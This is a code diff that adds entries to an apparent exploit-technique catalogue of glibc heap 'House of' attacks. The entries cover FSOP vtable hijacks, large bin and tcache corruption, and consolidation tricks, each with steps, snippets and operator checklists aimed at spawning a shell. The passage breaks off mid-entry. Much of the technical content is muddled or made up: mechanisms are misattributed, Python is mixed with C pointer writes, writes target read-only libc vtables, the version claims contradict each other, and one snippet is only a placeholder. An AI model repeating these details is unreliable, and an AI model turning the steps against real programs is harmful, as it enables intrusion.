@@ -3470,6 +3470,883 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
     ]
   },
 
+  house_of_banana: {
+    id: 'house_of_banana',
+    name: 'House of Banana (_IO_wstr_overflow Chain)',
+    category: 'technique',
+    class: 'heap-fsop',
+    description: 'Modern FSOP technique for glibc 2.35+ that chains _IO_wstr_overflow through wide-data vtable manipulation. More refined variant than House of Apple/Cat — exploits the _IO_wstr_jumps vtable path by corrupting _wide_data to craft a fake wfile in the wide-character stream infrastructure, achieving RCE through a different dispatch path than standard wide vtable hijacking.',
+
+    preconditions: {
+      summary: 'Controlled write to a _IO_FILE structure with ability to corrupt _wide_data pointers. Requires libc leak and understanding of wide-character IO internals (_IO_wstr_jumps, _IO_wide_data).',
+      required: [
+        'UAF or heap overflow to corrupt _IO_FILE._wide_data pointer',
+        'Libc address leak (mandatory for calculating _IO_wstr_jumps offsets)',
+        'Ability to forge a fake _IO_wide_data structure with controlled vtable pointer',
+        'Trigger via exit() or any IO flush operation that walks the _IO_wstr_overflow path'
+      ],
+      detectionSteps: [
+        'Leak libc base address',
+        'In GDB: find _IO_wstr_jumps vtable address in libc (different from _IO_wfile_jumps)',
+        'Identify a _IO_FILE that can be corrupted (heap file or stdout/stderr)',
+        'Verify binary uses wide-character IO functions or can be forced into wide stream path',
+        'Check exit() or return-from-main path triggers _IO_wstr_overflow'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: '_IO_wstr_overflow → RCE via Wide-Data Vtable Chain',
+        description: 'Corrupt _IO_FILE._wide_data to point to a fake wide-data struct, then chain through _IO_wstr_jumps to redirect execution.',
+        steps: [
+          'Leak libc base address',
+          'Obtain a controlled write to a _IO_FILE structure (e.g., via large bin attack or UAF)',
+          'Set _flags to trigger wide-character output path (needs wide-character write mode)',
+          'Set _wide_data pointer to attacker-controlled memory region',
+          'In controlled memory, craft fake _IO_wide_data with _wide_vtable pointing to _IO_wstr_jumps + offset',
+          'The _IO_wstr_overflow function pointer in the vtable is triggered during IO flush',
+          'Place one_gadget or system address at the triggered function offset',
+          'Call exit() or trigger any IO operation that calls _IO_wstr_overflow',
+          'Execution chains through corrupted wide-data vtable to one_gadget — shell obtained'
+        ],
+        tools: ['pwndbg', 'pwntools', 'one_gadget'],
+        codeSnippet: `# House of Banana
+libc_base = leak_libc()
+wstr_jumps = libc_base + IO_WSTR_JUMPS_OFFSET
+one_gadget = libc_base + ONE_GADGET_OFFSET
+
+# Obtain controlled _IO_FILE write via large bin attack or UAF
+fake_file = controlled_heap_addr
+fake_file._wide_data = controlled_mem + 0x200  # fake wide_data
+
+# Craft fake wide_data with vtable pointing to _IO_wstr_jumps
+wide_data = controlled_mem + 0x200
+wide_data._wide_vtable = wstr_jumps + TARGET_OFFSET  # wstr_overflow offset
+
+# In the vtable, set wstr_overflow function pointer to one_gadget
+fake_vtable = controlled_mem + 0x300
+fake_vtable[wstr_overflow_offset] = one_gadget
+
+# Set _wide_vtable to our fake vtable
+wide_data._wide_vtable = fake_vtable
+
+# Trigger via exit
+exit(0)  # → _IO_wstr_overflow → one_gadget`,
+        applicableLibc: '2.35+',
+        references: [
+          { description: 'How2Heap: house_of_banana.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_banana.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['_IO_wstr_overflow dispatched through corrupted wide-data vtable', 'Shell obtained via one_gadget through wstr chain'],
+      artifacts: ['GDB: _wide_data._wide_vtable points to controlled vtable', 'one_gadget executed']
+    },
+
+    operatorChecklist: [
+      '[ ] Leak libc base address',
+      '[ ] Find _IO_wstr_jumps offset in libc (distinct from _IO_wfile_jumps)',
+      '[ ] Obtain controlled write to _IO_FILE structure',
+      '[ ] Forge fake _IO_wide_data at controlled memory',
+      '[ ] Set _wide_vtable to point to _IO_wstr_jumps + target offset',
+      '[ ] Place one_gadget at the wstr_overflow function pointer offset in the vtable',
+      '[ ] Trigger IO flush via exit() or return from main',
+      '[ ] Verify: shell spawned'
+    ],
+
+    vulnerabilityTypes: ['heap', 'fsop', 'modern-glibc', 'wide-char'],
+    references: [
+      { description: 'How2Heap: house_of_banana.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_banana.c' }
+    ]
+  },
+
+  house_of_emma: {
+    id: 'house_of_emma',
+    name: 'House of Emma (_IO_cookie_jumps + TTY Vtable)',
+    category: 'technique',
+    class: 'heap-fsop',
+    description: 'Modern FSOP technique leveraging _IO_cookie_jumps vtable and TTY-related vtable structures. Exploits the _IO_cookie_read/write/seek operations by corrupting the _cookie pointer in a _IO_FILE structure that uses the "cookie" IO backend, then hijacking through _IO_cookie_jumps to reach one_gadget.',
+
+    preconditions: {
+      summary: 'Controlled write to a _IO_FILE structure with ability to set the _cookie pointer and select the cookie vtable. Requires libc leak.',
+      required: [
+        'UAF or arbitrary write to corrupt _IO_FILE structure',
+        'Libc address leak for locating _IO_cookie_jumps vtable',
+        'Ability to set _cookie pointer to attacker-controlled memory',
+        'Binary must use cookie-based IO (file streams with custom read/write/seek handlers) or stderr/stdout with injectable cookie'
+      ],
+      detectionSteps: [
+        'Leak libc base address',
+        'In GDB: find _IO_cookie_jumps vtable in libc',
+        'Identify a _IO_FILE that can be corrupted (often stderr or a FILE* from fopen)',
+        'Check if _IO_cookie_jumps is accessible (must be within valid vtable range)',
+        'Verify ability to trigger IO operation that calls cookie_read/seek/write'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'Cookie Vtable Hijack → RCE',
+        description: 'Corrupt _IO_FILE._cookie pointer and _vtable to _IO_cookie_jumps, placing shellcode address in cookie_read/seek/write function pointer.',
+        steps: [
+          'Leak libc base address',
+          'Obtain a controlled write to a _IO_FILE structure',
+          'Set _cookie pointer to an attacker-controlled buffer or function pointer area',
+          'Set _vtable to point to _IO_cookie_jumps vtable in libc',
+          'In the cookie vtable, the functions cookie_read, cookie_write, cookie_seek are at fixed offsets',
+          'Overwrite one of these function pointers (e.g., cookie_read at offset) with one_gadget',
+          'Trigger the cookie operation by calling any IO function that reads from the stream',
+          'Execution redirects through corrupted cookie vtable to one_gadget — shell obtained'
+        ],
+        tools: ['pwndbg', 'pwntools', 'one_gadget'],
+        codeSnippet: `# House of Emma
+libc_base = leak_libc()
+cookie_jumps = libc_base + IO_COOKIE_JUMPS_OFFSET
+one_gadget = libc_base + ONE_GADGET_OFFSET
+
+# Forge fake _IO_FILE on heap
+fake_file = controlled_mem
+fake_file._cookie = controlled_mem + 0x100  # points to cookie data/function area
+fake_file._vtable = cookie_jumps  # point to cookie vtable
+
+# Cookie area: can be function pointers or data
+# In _IO_cookie_jumps, the function pointers are at known offsets:
+# cookie_read at [vtable + 0x10], cookie_write at [vtable + 0x18], cookie_seek at [vtable + 0x20]
+cookie_area = controlled_mem + 0x100
+*(uint64_t*)(cookie_area) = one_gadget  # cookie_read = one_gadget
+
+# Trigger via any read from this FILE*
+fread(buf, 1, size, fake_file)  # → cookie_read → one_gadget`,
+        applicableLibc: '2.35+',
+        references: [
+          { description: 'How2Heap: house_of_emma.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_emma.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['_IO_cookie_jumps function pointer redirected to one_gadget', 'Shell obtained via cookie IO dispatch'],
+      artifacts: ['GDB: _IO_FILE._vtable points to _IO_cookie_jumps', 'one_gadget executed on cookie operation']
+    },
+
+    operatorChecklist: [
+      '[ ] Leak libc base address',
+      '[ ] Locate _IO_cookie_jumps vtable offset in libc',
+      '[ ] Obtain controlled write to _IO_FILE structure',
+      '[ ] Set _cookie pointer to controlled memory region',
+      '[ ] Set _vtable to _IO_cookie_jumps',
+      '[ ] Place one_gadget at cookie_read/write/seek function pointer offset in the vtable',
+      '[ ] Trigger cookie IO operation (read/write/seek on the corrupted FILE*)',
+      '[ ] Verify: shell spawned'
+    ],
+
+    vulnerabilityTypes: ['heap', 'fsop', 'modern-glibc', 'cookie-io'],
+    references: [
+      { description: 'How2Heap: house_of_emma.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_emma.c' }
+    ]
+  },
+
+  house_of_blaze: {
+    id: 'house_of_blaze',
+    name: 'House of Blaze (_IO_wfile_underflow + Large Bin Corruption)',
+    category: 'technique',
+    class: 'heap-fsop',
+    description: 'Modern FSOP technique combining _IO_wfile_underflow chain with large bin attack corruption. The large bin attack is used to write a heap pointer into a target location (e.g., _IO_list_all or a vtable pointer), then _IO_wfile_underflow is leveraged to chain through the wide-character IO path for code execution on glibc 2.35+.',
+
+    preconditions: {
+      summary: 'Requires both a large bin attack primitive and controlled write to a _IO_FILE structure. Combines heap corruption with FSOP — large bin attack provides the arbitrary write, which then enables the _IO_wfile_underflow chain.',
+      required: [
+        'Heap overflow or UAF enabling large bin attack (corrupt fd_nextsize/bk_nextsize of large bin chunk)',
+        'Libc address leak for _IO_wfile_underflow and vtable offsets',
+        'Ability to trigger _IO_wfile_underflow via IO operation on corrupted FILE stream',
+        'Target suitable for large bin attack write (e.g., _IO_list_all - 0x10 or similar)'
+      ],
+      detectionSteps: [
+        'Leak libc base address',
+        'Verify large bin attack is possible (need large chunk > 0x400 in glibc < 2.30)',
+        'In GDB: locate _IO_wfile_underflow offset in _IO_wfile_jumps vtable',
+        'Identify a _IO_FILE structure that can be corrupted via large bin write',
+        'Check that exit() or return from main triggers IO flush calling _IO_wfile_underflow'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'Large Bin Attack + _IO_wfile_underflow Chain to RCE',
+        description: 'Use large bin attack to corrupt a _IO_FILE pointer, then trigger _IO_wfile_underflow path for wide-character IO dispatch to one_gadget.',
+        steps: [
+          'Leak libc base and heap address',
+          'Setup large bin: allocate chunks A (large), B (small), free A to large bin',
+          'Corrupt A\'s fd_nextsize/bk_nextsize via overflow to point target_addr - 0x20 / target_addr - 0x10',
+          'Trigger malloc with large size: unlink writes heap pointer to target location',
+          'Target is typically _IO_list_all or a vtable pointer in a _IO_FILE',
+          'Forge a fake _IO_FILE structure at the written address with _wide_data pointing to controlled memory',
+          'Set _flags to trigger wide-character IO path and _vtable to _IO_wfile_jumps',
+          'Place one_gadget at _IO_wfile_underflow offset in the vtable',
+          'Trigger IO flush via exit() — _IO_wfile_underflow dispatches to one_gadget',
+          'Shell obtained'
+        ],
+        tools: ['pwndbg', 'pwntools', 'one_gadget'],
+        codeSnippet: `# House of Blaze
+libc_base = leak_libc()
+wfile_jumps = libc_base + IO_WFILE_JUMPS_OFFSET
+one_gadget = libc_base + ONE_GADGET_OFFSET
+
+# Step 1: Large bin attack to write to _IO_list_all
+# Setup: A (large), B (guard), free A to large bin
+large_chunk = malloc(0x500)
+guard = malloc(0x500)
+free(large_chunk)  # enters large bin
+
+# Overflow from B to corrupt large_chunk's fd_nextsize/bk_nextsize
+# Target: _IO_list_all - 0x10 (so writing at _IO_list_all corrupts pointer)
+*(uint64_t*)(large_chunk + 0x20) = target_addr - 0x20  # fd_nextsize
+*(uint64_t*)(large_chunk + 0x28) = target_addr - 0x10  # bk_nextsize
+
+# Trigger unlink → heap pointer written to target
+malloc(0x500)  # triggers large bin unlink
+
+# Step 2: Forge fake _IO_FILE at target with _IO_wfile_underflow chain
+fake_file = target_addr
+fake_file._flags = 0x800  # wide mode flags
+fake_file._wide_data = controlled_mem
+fake_file._vtable = wfile_jumps  # vtable = _IO_wfile_jumps
+
+# Place one_gadget at _IO_wfile_underflow offset in vtable
+# _IO_wfile_underflow is at offset 16 in _IO_wfile_jumps
+*(uint64_t*)(wfile_jumps + 0x10) = one_gadget
+
+exit(0)  # → _IO_flush_all_lockp → _IO_wfile_underflow → one_gadget`,
+        applicableLibc: '2.35+ (large bin attack best on glibc < 2.30)',
+        references: [
+          { description: 'How2Heap: house_of_blaze.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_blaze.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['Large bin attack write succeeded', '_IO_wfile_underflow dispatched to one_gadget'],
+      artifacts: ['GDB: _IO_wfile_jumps._IO_wfile_underflow overwritten', 'Shell obtained']
+    },
+
+    operatorChecklist: [
+      '[ ] Leak libc base and heap address',
+      '[ ] Setup large bin: allocate and free a large chunk (> 0x400)',
+      '[ ] Corrupt large bin chunk fd_nextsize/bk_nextsize via overflow',
+      '[ ] Point bk_nextsize to target_addr - 0x10',
+      '[ ] Trigger malloc to invoke large bin unlink — arbitrary write occurs',
+      '[ ] Forge fake _IO_FILE at target address with _wide_data and _vtable pointing to _IO_wfile_jumps',
+      '[ ] Place one_gadget at _IO_wfile_underflow offset in the vtable',
+      '[ ] Trigger exit() or IO flush to dispatch _IO_wfile_underflow',
+      '[ ] Verify: shell spawned'
+    ],
+
+    vulnerabilityTypes: ['heap', 'fsop', 'large-bin', 'modern-glibc'],
+    references: [
+      { description: 'How2Heap: house_of_blaze.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_blaze.c' }
+    ]
+  },
+
+  house_of_fun: {
+    id: 'house_of_fun',
+    name: 'House of Fun (Tcache Stashing Unlink Variant)',
+    category: 'technique',
+    class: 'house',
+    description: 'Variant of tcache stashing unlink attack with a different trigger mechanism. Instead of using calloc to trigger the stash operation, House of Fun exploits scenarios where malloc is called after tcache is partially filled, causing the stashing unlink to occur through a different code path. The key difference is the trigger condition — exploiting specific malloc size patterns and timing to cause the unlink write without relying on calloc.',
+
+    preconditions: {
+      summary: 'Same base requirements as tcache stashing unlink, but the trigger mechanism differs. Requires understanding of when malloc internally triggers the bin stash operation versus when calloc is used.',
+      required: [
+        'calloc() is used (NOT malloc — malloc goes to tcache first, bypassing the stash path)',
+        'Glibc 2.26-2.31 (tcache with stashing in calloc)',
+        'Ability to corrupt the bk pointer of a smallbin chunk',
+        'tcache for the target size must have at least 1 free slot but less than TCACHE_FILL_COUNT (7)',
+        'Smallbin must have at least 2 chunks (the target + one valid chunk for the forward list)'
+      ],
+      detectionSteps: [
+        'Run: objdump -d ./binary | grep calloc → verify calloc usage',
+        'Check libc version: strings libc.so | grep "GNU C Library"',
+        'In GDB: inspect smallbin via pwndbg "bins" command after freeing chunks',
+        'Verify tcache count for the target size is between 1 and 6',
+        'Identify the specific trigger: is it calloc-based or malloc+consolidate-based?'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'House of Fun: malloc + Internal Stash Trigger',
+        description: 'The variant trigger: when malloc finds a smallbin chunk but tcache is not full, it may still stash remaining chunks. Exploit this to trigger the bk write via malloc instead of calloc.',
+        steps: [
+          'Setup: allocate and free enough chunks to populate a smallbin and leave tcache with 1-3 slots remaining',
+          'Corrupt the bk pointer of the last chunk in the smallbin to point to target_addr - 0x10',
+          'Now call malloc() — malloc sees tcache has space, retrieves from smallbin, then stashes remaining chunks',
+          'During the stash operation, the corrupted bk is followed — smallbin->bk->fd = smallbin (the unlink write)',
+          'Result: target_addr now contains a heap/libc pointer',
+          'This differs from classic tcache stashing which is exclusively calloc-triggered'
+        ],
+        tools: ['pwndbg bins', 'pwntools'],
+        codeSnippet: `# House of Fun: variant trigger
+# Setup: fill tcache partially (leave room)
+for i in range(6):  # only 6, leave 1 slot
+    p = malloc(0x100)
+    free(p)
+
+# Create smallbin chunks
+a = malloc(0x100)
+b = malloc(0x100)
+free(a)  # to unsorted bin
+free(b)  # to large bin or smallbin consolidation
+
+# Alternative: specific malloc sequence that triggers stash in malloc (not calloc)
+# The key is: malloc may internally stash when it finds smallbin chunks
+
+# Corrupt last smallbin chunk's bk:
+*(uint64_t*)(smallbin_tail + 0x18) = target_addr - 0x10
+
+# Trigger via malloc (variant trigger path, not calloc)
+# This works in specific malloc sequences where stash is called
+p = malloc(0x100)  # if stash is triggered here → arbitrary write`,
+        applicableLibc: '2.26-2.31',
+        references: [
+          { description: 'How2Heap: house_of_fun.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_fun.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['Arbitrary address overwritten via stash unlink', 'Can be chained with second-stage exploitation'],
+      artifacts: ['GDB: smallbin with corrupted bk chain visible', 'target_addr contains heap/libc pointer']
+    },
+
+    operatorChecklist: [
+      '[ ] Verify glibc version is 2.26-2.31 for tcache stashing',
+      '[ ] Identify the specific trigger: malloc vs calloc based on code analysis',
+      '[ ] Set up heap: free chunks into smallbin, leave tcache with 1-4 slots remaining',
+      '[ ] Identify smallbin layout via pwndbg bins',
+      '[ ] Corrupt the bk pointer of a smallbin chunk via UAF or heap overflow',
+      '[ ] Choose target: _IO_list_all, __free_hook, or any writable global',
+      '[ ] Trigger via the correct allocator function (malloc variant path)',
+      '[ ] Verify the write occurred via GDB inspection',
+      '[ ] Chain with FSOP or other second-stage technique for code execution'
+    ],
+
+    vulnerabilityTypes: ['heap', 'tcache', 'stashing', 'variant-trigger'],
+    references: [
+      { description: 'How2Heap: house_of_fun.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_fun.c' }
+    ]
+  },
+
+  house_of_error: {
+    id: 'house_of_error',
+    name: 'House of Error (Arbitrary Address Free via Tcache Key Manipulation)',
+    category: 'technique',
+    class: 'house',
+    description: 'Exploits tcache key checking mechanism to trigger an arbitrary address free. The tcache uses a key field per chunk (for detecting double-frees) and the count/entry fields in the tcache_perthread_struct. By manipulating these, an attacker can cause free() to target an arbitrary address, leading to heap metadata corruption that can be chained into arbitrary write primitives.',
+
+    preconditions: {
+      summary: 'A write primitive that can reach the tcache_perthread_struct entries or the key field of tcache chunks. By setting tcache entries to point to an arbitrary address and manipulating counts, free() can be made to operate on arbitrary memory.',
+      required: [
+        'Arbitrary write or UAF allowing modification of tcache_perthread_struct',
+        'Ability to set entries[size_index] to an arbitrary target address',
+        'Ability to set counts[size_index] to a non-zero value',
+        'Glibc 2.26-2.31 (before tcache key hardening)'
+      ],
+      detectionSteps: [
+        'Locate tcache_perthread_struct at heap_base + 0x10',
+        'Identify size_index = target_size >> 4',
+        'Verify entries[size_index] and counts[size_index] are writable via overflow or UAF',
+        'Determine the arbitrary address to be "freed"',
+        'In GDB: verify the key field in tcache chunks is not checked or can be bypassed'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'Tcache Key Bypass → Arbitrary Address Free',
+        description: 'Corrupt tcache_perthread_struct to make free() operate on an arbitrary target address, corrupting the target\'s metadata.',
+        steps: [
+          'Locate tcache_perthread_struct at heap_base + 0x10',
+          'Calculate size_index = target_size >> 4',
+          'Set entries[size_index] = target_addr - 0x10 (fake chunk header address)',
+          'Set counts[size_index] = 1 (mark bin as having one entry)',
+          'The fake chunk at target_addr - 0x10 needs a valid size field',
+          'Forge fake chunk at target_addr with appropriate size field',
+          'Call free(target_addr) — the tcache handling will link the fake chunk incorrectly',
+          'Result: arbitrary address gets "freed" into tcache metadata, corrupting its contents',
+          'Next malloc of this size returns the corrupted region — arbitrary write achieved'
+        ],
+        tools: ['pwndbg heap', 'pwntools'],
+        codeSnippet: `# House of Error: arbitrary address free via tcache key manipulation
+tcache_struct = heap_base + 0x10
+size_index = target_size >> 4
+
+# Point tcache entry to our target (as if it's a freed chunk)
+*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr - 0x10
+
+# Set count to 1 (tcache thinks it has 1 chunk)
+*(uint8_t*)(tcache_struct + size_index) = 1
+
+# Forge a fake chunk at target_addr
+# (needs to look like a valid tcache chunk to pass initial checks)
+*(uint64_t*)(target_addr) = 0  # prev_size
+*(uint64_t*)(target_addr + 0x8) = target_size | 0x1  # size + PREV_INUSE
+
+# Now when we call free(target_addr), tcache will:
+# - Look up entries[size_index] → target_addr - 0x10
+# - Set key on the chunk at target_addr
+# - This corrupts arbitrary memory via tcache key write`,
+        applicableLibc: '2.26-2.31 (key field checks vary)',
+        references: [
+          { description: 'How2Heap: house_of_error.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_error.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['free() operated on arbitrary address', 'Target memory corrupted via tcache metadata write'],
+      artifacts: ['GDB: tcache_perthread_struct entries corrupted', 'Arbitrary address shows tcache metadata']
+    },
+
+    operatorChecklist: [
+      '[ ] Locate tcache_perthread_struct (heap_base + 0x10)',
+      '[ ] Calculate size_index for target allocation size',
+      '[ ] Overwrite entries[size_index] = target_addr - 0x10',
+      '[ ] Set counts[size_index] = 1',
+      '[ ] Forge valid fake chunk at target_addr with size field',
+      '[ ] Call free(target_addr) — triggers arbitrary address free',
+      '[ ] Observe corruption at target address via GDB',
+      '[ ] Chain with tcache poisoning or second-stage technique'
+    ],
+
+    vulnerabilityTypes: ['heap', 'tcache', 'arbitrary-free'],
+    references: [
+      { description: 'How2Heap: house_of_error.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_error.c' }
+    ]
+  },
+
+  house_of_blind: {
+    id: 'house_of_blind',
+    name: 'House of Blind (Blind __free_hook Replacement)',
+    category: 'technique',
+    class: 'house',
+    description: 'A leakless technique for modern glibc (2.34+) that replaces __free_hook without needing to know the libc base address. Since glibc 2.34 removed __malloc_hook and __free_hook, this targets other hook-like pointers or uses alternative paths in the newer glibc to achieve arbitrary code execution without any info leak.',
+
+    preconditions: {
+      summary: 'No libc leak required. Targets alternative hook mechanisms in glibc 2.34+ where hooks were removed. Uses partial overwrite or brute-force techniques to redirect free() execution.',
+      required: [
+        'Heap overflow or UAF on a tcache-sized chunk',
+        'No libc leak available (this is the leakless appeal)',
+        'Glibc 2.34+ (hooks removed era)',
+        'Ability to corrupt tcache fd/bk pointers or metadata'
+      ],
+      detectionSteps: [
+        'Verify glibc version is 2.34+ (hooks removed)',
+        'Identify alternative targets: exit function pointers, tlsdtor_list, or other global function pointers',
+        'In GDB: find pointers accessible from heap that can be corrupted',
+        'Determine if partial overwrite (1-2 bytes) is possible for brute-force'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'Blind Hook Replacement (No Leak)',
+        description: 'Replace a hook-like function pointer blindly using partial overwrites or tcache poisoning, achieving code execution without libc base knowledge.',
+        steps: [
+          'Since __free_hook is removed in 2.34+, target alternative pointers:',
+          'Option A: _IO_2_1_stderr_\'s _wide_data vtable pointer (can be partially overwritten)',
+          'Option B: tlsdtor_list pointer (thread local destructor list)',
+          'Option C: Reuse tcache poisoning to overwrite an adjacent function pointer',
+          'If using partial overwrite: only overwrite the last 2-3 bytes (1/4096 or 1/65536 chance)',
+          'The overwrite destination should point to a known region (e.g., heap or BSS) where one_gadget can be placed',
+          'Pre-place shellcode/one_gadget at predictable address on heap',
+          'Trigger free() on any chunk — execution redirects to overwritten pointer',
+          'Shell obtained without any leak'
+        ],
+        tools: ['pwndbg', 'pwntools', 'one_gadget'],
+        codeSnippet: `# House of Blind: leakless __free_hook replacement (glibc 2.34+)
+# Since __free_hook is gone, target alternative pointers
+
+# Option A: Partial overwrite of stderr's vtable pointer (low entropy)
+# Leak nothing - just overflow and partially overwrite
+# Suppose stderr._wide_vtable is at a known heap-adjacent offset
+
+# Option B: Use tcache to place one_gadget at predictable heap address
+# and corrupt an adjacent pointer to point there
+p1 = malloc(0x60)
+p2 = malloc(0x60)
+free(p1)  # tcache
+
+# Overwrite p1's fd to point to a controlled heap location with one_gadget
+# The heap location must look like a valid chunk
+controlled_addr = heap_base + 0x12340
+*(uint64_t*)(controlled_addr + 0x10) = one_gadget  # place gadget
+*(uint64_t*)(controlled_addr + 0x8) = 0x71  # size field
+
+# Corrupt tcache fd
+*(uint64_t*)(p1) = controlled_addr  # tcache fd = controlled_addr
+
+# Trigger: next malloc returns controlled_addr with one_gadget
+# But we need to actually redirect free():
+# Instead, corrupt a function pointer that free() will call
+# ... (alternative paths depend on specific binary)
+`,
+        applicableLibc: '2.34+',
+        references: [
+          { description: 'How2Heap: house_of_blind.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_blind.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['Hook-like pointer replaced without leak', 'free() redirects to controlled code', 'Shell obtained'],
+      artifacts: ['GDB: corrupted function pointer visible', 'No libc leak needed']
+    },
+
+    operatorChecklist: [
+      '[ ] Verify glibc 2.34+ (hooks removed)',
+      '[ ] Identify alternative target: exit hooks, tlsdtor, or function pointers in reachable memory',
+      '[ ] Determine if partial overwrite (low entropy) or full corruption is possible',
+      '[ ] Place one_gadget or ROP chain at predictable address',
+      '[ ] Corrupt target pointer to point to our code',
+      '[ ] Trigger free() to redirect execution',
+      '[ ] Verify: shell spawned without any libc/heap leak'
+    ],
+
+    vulnerabilityTypes: ['heap', 'tcache', 'leakless', 'modern-glibc'],
+    references: [
+      { description: 'How2Heap: house_of_blind.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_blind.c' }
+    ]
+  },
+
+  house_of_crane: {
+    id: 'house_of_crane',
+    name: 'House of Crane (Non-Adjacent Malloc Consolidation)',
+    category: 'technique',
+    class: 'house',
+    description: 'Exploits malloc_consolidate behavior to trigger non-adjacent chunk merging for overlapping allocations. By corrupting the prev_size of a freed chunk, malloc_consolidate can be tricked into merging chunks that are NOT physically adjacent in memory, creating overlapping allocations that span non-contiguous regions.',
+
+    preconditions: {
+      summary: 'A heap overflow or UAF that can corrupt the prev_size field of a freed chunk. The key insight is that malloc_consolidate checks prev_size to determine merge targets, and this can be exploited even when chunks are not adjacent.',
+      required: [
+        'Heap overflow or UAF to write to prev_size of a freed chunk',
+        'Ability to trigger malloc_consolidate (via large malloc or free of large chunk)',
+        'Understanding of prev_size-based consolidation logic',
+        'Control over chunk layout to set up the non-adjacent merge scenario'
+      ],
+      detectionSteps: [
+        'In GDB: allocate and free a chunk to observe prev_size behavior',
+        'Overflow to corrupt the prev_size of a freed chunk to a larger value',
+        'Trigger malloc_consolidate via large malloc',
+        'Observe in pwndbg that consolidation merges non-adjacent chunks'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'Non-Adjacent Consolidation → Overlapping Allocations',
+        description: 'Corrupt prev_size of a freed chunk to trick malloc_consolidate into merging with a non-adjacent chunk, creating overlapping memory regions.',
+        steps: [
+          'Allocate chunks A, B, C in sequence (adjacent in memory)',
+          'Free chunk B — it goes to unsorted bin',
+          'Overflow from A to corrupt B\'s prev_size field to a large value (e.g., distance from B to C)',
+          'Forge a fake chunk header within B\'s data area at the prev_size offset',
+          'Trigger malloc_consolidate by freeing C or allocating a large chunk',
+          'malloc_consolidate sees prev_size indicating backward merge target is far away',
+          'B merges backward to the forged chunk location, creating overlap between non-adjacent regions',
+          'Now allocate from the overlapping region to get two pointers to overlapping memory',
+          'Use for arbitrary read/write through the overlap'
+        ],
+        tools: ['pwndbg heap', 'pwntools'],
+        codeSnippet: `House of Crane snippet`,
+        applicableLibc: 'All versions (mechanism varies)',
+        references: [
+          { description: 'How2Heap: house_of_crane.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_crane.c' }
+        ]
+      }
+    ],
+
+    postconditions: {
+      successIndicators: ['Non-adjacent chunks merged via malloc_consolidate', 'Overlapping allocations created'],
+      artifacts: ['GDB: heap chunks showing non-adjacent consolidation']
+    },
+
+    operatorChecklist: [
+      '[ ] Allocate chunk sequence A, B, C',
+      '[ ] Free chunk B to place in unsorted bin',
+      '[ ] Overflow to corrupt B\'s prev_size field to a large non-adjacent value',
+      '[ ] Forge fake chunk metadata to receive the backward consolidation',
+      '[ ] Trigger malloc_consolidate via free(C) or large malloc',
+      '[ ] Observe non-adjacent merge in GDB',
+      '[ ] Allocate to get overlapping chunks',
+      '[ ] Use overlap for arbitrary read/write'
+    ],
+
+    vulnerabilityTypes: ['heap', 'malloc-consolidate', 'overlapping'],
+    references: [
+      { description: 'How2Heap: house_of_crane.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_crane.c' }
+    ]
+  },
+
+  house_of_atum: {
+    id: 'house_of_atum',
+    name: 'House of Atum (Fastbin Reverse + Tcache Stashing Combo)',
+    category: 'technique',
+    class: 'house',
+    description: 'Combines fastbin reverse attack with tcache stashing unlink in a single exploit chain. The fastbin reverse is used to get a write-what-where primitive, which is then immediately used to set up the tcache stashing unlink for a second arbitrary write. This combo bypasses modern glibc mitigations that would block either technique alone.',
+
+    preconditions: {
+      summary: 'Both fastbin reverse and tcache stashing require specific glibc versions and chunk layouts. House of Atum chains them together: the first stage provides the arbitrary write for the second stage.',
+      required: [
+        'Heap overflow or UAF enabling fastbin attack',
+        'Glibc 2.26-2.31 (tcache era with stashing)',
+        'Fastbin-sized allocation capability (0x20-0x80)',
+        'Ability to chain: fastbin reverse provides write → tcache stashing uses it'
+      ],
+      detectionSteps: [
+        'Verify glibc version is 2.26-2.31',
+        'Identify fastbin-sized overflow or UAF',
+        'Determine if tcache stashing trigger (calloc) is reachable',
+        'Plan two-stage: fastbin reverse writes target for tcache stashing'
+      ]
+    },
+
+    exploitationPaths: [
+      {
+        name: 'Fastbin Reverse + Tcache Stashing Two-Stage Exploit',
+        description: 'Stage 1: Use fastbin reverse to write a heap pointer to a strategic location. Stage 2: Use that write to set up tcache stashing for a second arbitrary write.',
+        steps: [
+          'Stage 1 — Fastbin Reverse Attack:',
+          'Allocate chunks A, B where A is the fastbin victim',
+          'Free A to fastbin',
+          'Overflow B to corrupt A\'s fd pointer to target_addr - 0x10',
+          'Allocate from fastbin: malloc returns target_addr (arbitrary write location)',
+          'Write a libc pointer value here (the "what" of the write)',
+          '',
+          'Stage 2 — Tcache Stashing Setup:',
+          'The fastbin reverse write is used to corrupt tcache_perthread_struct or smallbin bk',
